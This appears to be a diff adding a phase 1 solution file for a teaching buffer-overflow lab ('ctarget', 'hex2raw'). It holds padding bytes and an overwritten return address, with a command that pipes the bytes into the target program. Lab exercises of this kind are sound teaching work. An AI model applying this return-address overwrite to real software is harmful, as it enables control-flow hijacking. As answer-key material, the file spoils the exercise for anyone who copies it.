@@ -1,0 +1,13 @@
+/* 	Usage:Go to target1 path and run this command : 
+		./hex2raw < solutions/phase_1.txt | ./ctarget 
+*/
+/* Filled Padding */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Target Address */
+c0 17 40 00 00 00 00 00
+
+
